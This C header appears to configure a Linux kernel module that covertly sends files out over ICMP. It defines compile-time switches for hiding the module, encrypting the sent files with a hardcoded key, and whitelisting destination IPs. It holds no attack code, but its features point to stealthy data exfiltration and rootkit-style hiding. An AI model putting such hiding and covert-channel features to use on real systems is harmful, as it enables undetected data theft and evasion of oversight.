/*
 * This file is part of the kfile-over-icmp module (https://github.com/spiderpig1297/kfile-over-icmp).
 * Copyright (c) 2020 spiderpig1297.
 * 
 * This program is free software: you can redistribute it and/or modify  
 * it under the terms of the GNU General Public License as published by  
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but 
 * WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU 
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License 
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
#pragma once

// TODO: use kconfig to allow configuration via a menu.

#define CONFIG_HIDE_MODULE

#define CONFIG_ENCRYPT_FILE
#define CONFIG_ENCRYPTION_KEY       (0x1d8a2fe91cb4dd2e)
#define CONFIG_ENCRYPTION_KEY_SIZE  (8)

#define CONFIG_ICMP_WHITELIST_DST_IPS
#ifdef CONFIG_ICMP_WHITELIST_DST_IPS
extern const char *WHITELIST_DST_IPS[];
#endif

// #define CONFIG_ICMP_WHITELIST_SRC_IP
#ifdef CONFIG_ICMP_WHITELIST_SRC_IP
extern const char *WHITELIST_SRC_IPS[];
#endif
